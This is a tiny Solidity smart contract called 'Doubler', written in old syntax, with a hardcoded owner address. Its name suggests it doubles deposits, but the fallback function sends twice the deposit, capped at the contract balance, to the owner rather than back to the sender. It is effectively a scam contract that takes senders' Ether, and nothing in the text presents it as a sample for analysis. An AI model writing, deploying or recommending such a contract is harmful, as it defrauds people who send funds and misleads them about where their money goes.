contract Doubler {
    address owner = 0xdbf03b407c01e7cd3cbea99509d93f8dddc8c6fb;
    
    function add_funds() {}
    
    function() {
        uint amount = msg.value * 2;
        if (amount > this.balance) {
            amount = this.balance;
        }
        owner.send(amount);
    }
}
